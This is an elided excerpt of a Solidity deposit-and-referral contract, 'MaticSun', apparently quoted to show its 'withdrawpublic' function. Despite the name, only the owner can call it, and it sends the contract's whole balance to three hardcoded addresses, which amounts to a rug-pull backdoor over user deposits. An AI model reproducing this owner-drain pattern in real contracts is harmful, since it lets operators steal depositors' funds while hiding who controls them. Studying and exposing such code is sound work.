...
contract MaticSun {
    ...
    // Limits
    uint256 public constant DEPOSIT_MIN_AMOUNT = 0 ether;
    // Before reinvest
    ...
    function deposit(address _referral) external payable {
        ...
        require(player.deposits.length < 4000000, "Max 4000000 deposits per address");
 ...
 function autoReinvest( uint256 _amount) private returns (bool) {
    ...
    function withdrawpublic() public{
        ...
        require(msg.sender == owner,'withdraw public is dissabled');
        uint pubWid = address(this).balance;
        
         uint beneficiaryTrx =(pubWid * 23)/100 ;
         uint beneficiaryTwoTrx =(pubWid * 22)/100 ;
         uint secondTrx = (pubWid * 55)/100 ;
         
         dvar.transfer(secondTrx);
         adar.transfer(beneficiaryTwoTrx);
         mkar.transfer(beneficiaryTrx);
